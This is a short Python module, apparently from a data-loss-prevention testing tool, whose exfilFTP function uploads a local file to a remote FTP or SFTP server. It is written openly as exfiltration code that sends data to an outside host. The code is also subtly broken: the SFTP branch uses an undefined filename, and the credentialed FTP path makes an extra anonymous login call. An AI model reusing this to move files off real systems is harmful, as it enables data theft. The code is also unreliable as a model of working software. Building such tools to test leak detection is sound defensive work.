from ftplib import FTP
from pathlib import Path
import pysftp
import logging

# Exfiltrate data over FTP
def exfilFTP(server, directory, datafile, TLS=False, username='', password=''):
    logging.debug("Using FTP exfiltration")
    try:
        if not TLS:
            logging.debug("Attempting to upload file over FTP")
            if username != '' and password != '':
                logging.debug("Using FTP credentials")
                ftp = FTP(server, username, password)
            else:
                logging.debug("Using anonymous FTP")
                ftp = FTP(server)
            ftp.login()
            ftp.cwd(directory)
            logging.debug("logged in and set up ftp connection")
            filename = Path(datafile).name
            with open(datafile, "rb") as rb:
                logging.debug("Uploading file: " + filename + " to directory: " + directory + " on server: " + server + " over FTP")
                ftp.storbinary(f"STOR dlpd_ftp_{filename}", rb)
                logging.debug("stored file")
        else:
            logging.debug("Attempting to upload file over SFTP with credentials")
            with pysftp.Connection(server, username=username, password=password) as sftp:
                with sftp.cd(directory):
                    logging.debug("logged in and set up SFTP connection")
                    logging.debug("Uploading file: " + filename + " to directory: " + directory + " on server: " + server + " over SFTP")
                    sftp.put(datafile)
                    logging.debug("stored file")

        logging.debug("File upload over FTP successful!")
        return True
    except Exception as e:
        logging.error(f"Failed to upload file over FTP: {e}")
        return False